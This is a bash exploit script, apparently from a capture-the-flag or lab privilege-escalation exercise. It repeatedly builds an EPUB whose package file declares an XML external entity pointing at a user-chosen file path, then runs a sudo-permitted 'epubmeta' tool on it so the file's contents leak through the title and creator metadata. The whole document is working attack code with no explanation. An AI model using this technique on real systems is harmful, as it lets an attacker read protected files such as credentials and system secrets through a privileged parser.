#!/bin/bash

create_epub() {
    TARGET_FILE=$1
    WORK_DIR="epub_exploit"
    META_INF_DIR="$WORK_DIR/META-INF"

    mkdir -p "$META_INF_DIR"

    cat > "$META_INF_DIR/container.xml" <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<container version="1.0" xmlns="urn:oasis:names:tc:opendocument:xmlns:container">
  <rootfiles>
    <rootfile full-path="content.opf" media-type="application/oebps-package+xml"/>
  </rootfiles>
</container>
EOF

    cat > "$WORK_DIR/content.opf" <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE package [
  <!ENTITY xxe SYSTEM "$TARGET_FILE">
]>
<package xmlns="http://www.idpf.org/2007/opf" version="3.0" unique-identifier="bookid">
  <metadata xmlns:dc="http://purl.org/dc/elements/1.1/">
    <dc:title>&xxe;</dc:title>
    <dc:creator>&xxe;</dc:creator>
    <dc:language>en</dc:language>
  </metadata>
  <manifest>
  </manifest>
  <spine>
  </spine>
</package>
EOF

    pushd "$WORK_DIR" > /dev/null
    zip -r ../test.epub META-INF/ content.opf > /dev/null
    popd > /dev/null

    rm -rf "$WORK_DIR"

    echo -e "\n[*] Exploit EPUB created: test.epub"
}

while true; do
    echo -e "\n-------------------------------------------"
    echo "Enter the path of the file to read (or 'exit' to quit):"
    read -r TARGET_FILE

    if [ "$TARGET_FILE" == "exit" ]; then
        echo -e "\n[*] Exiting..."
        break
    fi

    create_epub "$TARGET_FILE"

    echo -e "\n[*] Running: sudo /usr/local/bin/epubmeta test.epub"
    sudo /usr/local/bin/epubmeta test.epub

    echo -e "\n-------------------------------------------"
done
